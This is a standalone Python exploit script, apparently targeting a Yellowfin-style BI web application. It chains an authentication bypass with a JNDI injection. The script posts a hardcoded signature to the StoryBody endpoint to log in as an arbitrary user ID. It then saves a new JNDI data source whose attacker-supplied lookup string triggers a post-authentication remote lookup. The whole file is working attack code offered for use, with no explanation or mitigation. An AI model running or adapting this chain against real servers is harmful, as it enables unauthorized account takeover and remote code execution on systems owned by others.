import requests, os, uuid, json

ID = os.sys.argv[1]
url = os.sys.argv[2]
jndi = os.sys.argv[3]

s = requests.Session()
s.get(url)

def loginAs(ID):
	print(f"LOG: Attempting to Bypass Auth as User ID - {ID}")
	validSig = """FeHGWgaVoDHPbZYf0+I6BSAHBSacV/2MjbVtnaHLbnuW3cr0sLs2rwo1MWtZ1mtmNwjLLY1nXfZX+BL9FMwc4poix6WpEvQTGr0oxOmOQe82SF0/iJV8FRYNZPEJ8vVjuMh9c7zxo6A1zEqWRiTdWx5HFvF+saEIug6ujYIXx8jptzxMzkRn77FIx4McnPBLlfoodjkKXufrsK2JBOvqXjOsgJqv9SdZqcbm9LnQ4GolYGCHvsLZ9MTHFzIS37TNjRULVupdC92f+90Any6FvIYMsGiozp/c235+xPV68WNmLgLFsYyRR7RjN4oWq7yb+T5hIhlQnJr8CIej2eVq6w=="""
	s.post(
		url+"/StoryBody.i4",
		data = {
			"storyUUID": "PEWPEW",
			"ts": "XXD",
			"s":validSig,
			"action":"WHATEVER",
			"ipPerson":ID,
			"ipOrg":"1"
		}
	)
	return True

def triggerJNDI(jndi):
	print(f"LOG: Trigger JNDI Post Auth Exp - {jndi}")
	payload = {
    	"restrictedSourceCreation": False,
    	"displaySourceIcon": "connection_type_jndi",
    	"sourceClassName": "com.hof.sources.JNDISourcePlatformImplementation",
    	"enabledForTransformations": False,
    	"connectionMethodCode": "JNDI",
    	"displaySourceLongDescription": "",
    	"customParameters": [
        	{
            	"displayType": 4,
            	"defaultValue": "",
            	"displayName": "JNDI Datasource Name",
            	"uniqueKey": "DATABASEURL",
            	"disabled": False,
            	"refreshOnChange": False,
            	"value": jndi,
            	"clearsAllParameters": False,
            	"options": None
        	}
    	],
    	"userCanCreateView": True,
    	"databaseTypeCode": "GENERICJDBC",
    	"displaySourceName": "JNDI",
    	"validationMessages": "",
    	"sourceName": "PEW",
    	"sourceDescription": "HACKED"
	}
	r=s.post(
		url+f"/CreateSimpleSourceAjax.i4;tab_token={uuid.uuid4()};m=1?REQUESTTOKEN=None",
		data = {
			"action":"save",
			"json": json.dumps(payload),
			"testConnection": "true",
			"importPredefinedContent":""
		}
	)
	print(r.json())

if __name__ == '__main__':
	print("LOG: Starting FullChain Exploit!!!")
	loginAs(ID)
	triggerJNDI(jndi)
	print("LOG: DONE")

